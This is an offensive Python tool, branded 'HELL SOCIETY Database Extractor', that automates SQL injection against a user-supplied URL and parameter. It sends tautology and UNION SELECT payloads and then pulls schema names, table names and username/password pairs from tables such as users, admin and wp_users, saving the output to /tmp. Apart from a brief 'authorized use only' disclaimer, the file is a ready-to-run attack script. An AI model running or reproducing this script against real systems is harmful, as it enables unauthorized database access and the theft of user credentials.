#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  DATABASE EXTRACTOR v2.0                                         ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Database Extraction                       ║
║  Description: Extract data from databases via SQLi (authorized) ║
╚══════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import requests
import colorama
from colorama import Fore, Back, Style
import argparse
import time
import re
import json

colorama.init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║{Fore.CYAN}  ██████╗ ██╗   ██╗███████╗████████╗                            ║
║{Fore.CYAN}  ██╔══██╗██║   ██║██╔════╝╚══██╔══╝                            ║
║{Fore.CYAN}  ██║  ██║██║   ██║███████╗   ██║                               ║
║{Fore.CYAN}  ██║  ██║██║   ██║╚════██║   ██║                               ║
║{Fore.CYAN}  ██████╔╝╚██████╔╝███████║   ██║                               ║
║{Fore.CYAN}  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝                               ║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.YELLOW}  HELL SOCIETY - Database Extractor v2.0                        {Fore.RED}║
╚══════════════════════════════════════════════════════════════════╝
"""

WARNING = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║  ADVERTENCIA: Solo para entornos autorizados. Hell Society NO se           ║
║  hace responsable del mal uso. Acceso no autorizado es ILEGAL.             ║
╚══════════════════════════════════════════════════════════════════╝
"""

class DatabaseExtractor:
    def __init__(self, url, param=None):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) HellSociety/2.0',
        })
        self.extracted_data = []
        self.is_vulnerable = False

    def test_injection(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  TESTING SQL INJECTION:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Get baseline response
        try:
            if self.param:
                baseline = self.session.get(f"{self.url}?{self.param}=1", timeout=10)
            else:
                baseline = self.session.get(self.url, timeout=10)
            baseline_len = len(baseline.text)
            print(f"  {Fore.WHITE}Baseline response: {baseline_len} bytes")
        except:
            print(f"  {Fore.RED}[!] Cannot reach target")
            return False

        # Test payloads
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        ]

        for payload in payloads:
            try:
                if self.param:
                    test_url = f"{self.url}?{self.param}={payload}"
                else:
                    test_url = f"{self.url}/{payload}"

                resp = self.session.get(test_url, timeout=10)
                resp_len = len(resp.text)

                # Check for SQL errors
                sql_errors = [
                    'SQL syntax', 'mysql_fetch', 'mysqli_fetch',
                    'Unclosed quotation', 'SQL error', 'ORA-',
                    'PostgreSQL', 'sqlite', 'ODBC',
                    'warning: mysql', 'warning: pg',
                ]

                for error in sql_errors:
                    if error.lower() in resp.text.lower():
                        print(f"  {Fore.GREEN}[+] SQL INJECTION FOUND!")
                        print(f"  {Fore.WHITE}  Payload: {payload}")
                        print(f"  {Fore.WHITE}  Error: {error}")
                        self.is_vulnerable = True
                        return True

                # Check for length difference (blind injection)
                if abs(resp_len - baseline_len) > 50:
                    print(f"  {Fore.GREEN}[+] Possible injection (length diff: {resp_len - baseline_len})")
                    print(f"  {Fore.WHITE}  Payload: {payload}")
                    self.is_vulnerable = True
                    return True

            except:
                pass

        print(f"  {Fore.YELLOW}[-] No injection detected with basic payloads")
        return False

    def extract_databases(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  EXTRACTING DATABASES:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        if not self.is_vulnerable:
            print(f"  {Fore.YELLOW}[-] Target not confirmed vulnerable")
            return

        # Try to extract database names
        queries = [
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,GROUP_CONCAT(schema_name),11--", "MySQL schemas"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,databasename,11 FROM information_schema.databases--", "MySQL DBs"),
        ]

        for query, desc in queries:
            try:
                test_url = f"{self.url}?{self.param}={query}"
                resp = self.session.get(test_url, timeout=10)

                if resp.status_code == 200:
                    print(f"  {Fore.WHITE}  {desc}:")
                    print(f"  {Fore.WHITE}  Response length: {len(resp.text)} bytes")
                    self.extracted_data.append({'type': desc, 'length': len(resp.text)})
            except:
                pass

    def extract_tables(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  EXTRACTING TABLES:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        queries = [
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,GROUP_CONCAT(table_name),11 FROM information_schema.tables--", "Table names"),
        ]

        for query, desc in queries:
            try:
                test_url = f"{self.url}?{self.param}={query}"
                resp = self.session.get(test_url, timeout=10)

                if resp.status_code == 200:
                    print(f"  {Fore.WHITE}  {desc}:")
                    # Try to extract and display
                    match = re.search(r'(\w+_\w+)', resp.text)
                    if match:
                        print(f"  {Fore.GREEN}[+] Found tables in response")
                    print(f"  {Fore.WHITE}  Response length: {len(resp.text)} bytes")
            except:
                pass

    def extract_credentials(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  EXTRACTING CREDENTIALS:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        queries = [
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,GROUP_CONCAT(username,':',password),11 FROM users--", "users table"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,GROUP_CONCAT(user,':',pass),11 FROM admin--", "admin table"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,GROUP_CONCAT(name,':',email,':',password),11 FROM members--", "members table"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,GROUP_CONCAT(login,':',passwd),11 FROM wp_users--", "wp_users"),
        ]

        for query, desc in queries:
            try:
                test_url = f"{self.url}?{self.param}={query}"
                resp = self.session.get(test_url, timeout=10)

                if resp.status_code == 200:
                    # Look for common credential patterns
                    email_matches = re.findall(r'[\w.]+@[\w.]+\.\w+', resp.text)
                    if email_matches:
                        print(f"  {Fore.GREEN}[+] Credentials from {desc}:")
                        for cred in email_matches[:10]:
                            print(f"    {Fore.WHITE}• {cred}")
                        self.extracted_data.append({'type': 'credentials', 'desc': desc, 'count': len(email_matches)})
            except:
                pass

    def dump_full_database(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DATABASE DUMP:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        if not self.is_vulnerable:
            print(f"  {Fore.YELLOW}[-] Cannot dump - not vulnerable")
            return

        print(f"  {Fore.WHITE}Attempting full database dump...")
        print(f"  {Fore.CYAN}  [*] Extracting schema information...")

        # Try to get version
        try:
            test_url = f"{self.url}?{self.param}=' UNION SELECT 1,2,3,4,5,6,7,8,9,VERSION(),11--"
            resp = self.session.get(test_url, timeout=10)
            print(f"  {Fore.WHITE}  MySQL Version: Check response")
        except:
            pass

        # Try to get current user
        try:
            test_url = f"{self.url}?{self.param}=' UNION SELECT 1,2,3,4,5,6,7,8,9,CURRENT_USER(),11--"
            resp = self.session.get(test_url, timeout=10)
            print(f"  {Fore.WHITE}  Current User: Check response")
        except:
            pass

        # Try to get database name
        try:
            test_url = f"{self.url}?{self.param}=' UNION SELECT 1,2,3,4,5,6,7,8,9,DATABASE(),11--"
            resp = self.session.get(test_url, timeout=10)
            print(f"  {Fore.WHITE}  Database Name: Check response")
        except:
            pass

        # Save full response for analysis
        try:
            test_url = f"{self.url}?{self.param}=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--"
            resp = self.session.get(test_url, timeout=10)
            with open('/tmp/db_dump_output.html', 'w') as f:
                f.write(resp.text)
            print(f"\n  {Fore.GREEN}[+] Full dump saved: /tmp/db_dump_output.html")
        except:
            pass

    def run(self):
        print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{self.url}")
        print(f"{Fore.CYAN}  [*] Parameter: {Fore.WHITE}{self.param}")
        print(f"{Fore.CYAN}  [*] Starting database extraction...\n")

        if self.test_injection():
            self.extract_databases()
            self.extract_tables()
            self.extract_credentials()
            self.dump_full_database()
        else:
            print(f"\n  {Fore.YELLOW}[-] Target appears not vulnerable to basic SQLi")
            print(f"  {Fore.CYAN}  [i] Try more advanced payloads or use sqlmap")

        # Save all extracted data
        with open('/tmp/db_extract_results.json', 'w') as f:
            json.dump(self.extracted_data, f, indent=2, default=str)
        print(f"\n  {Fore.GREEN}[+] Results saved: /tmp/db_extract_results.json")

        print(f"\n\n{Fore.GREEN}{Back.BLACK}  DATABASE EXTRACTION COMPLETE  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

if __name__ == "__main__":
    print(BANNER)
    print(WARNING)

    parser = argparse.ArgumentParser(description='Hell Society Database Extractor')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', required=True, help='Parameter to inject (e.g., id, user)')
    args = parser.parse_args()

    extractor = DatabaseExtractor(args.url, args.param)
    extractor.run()
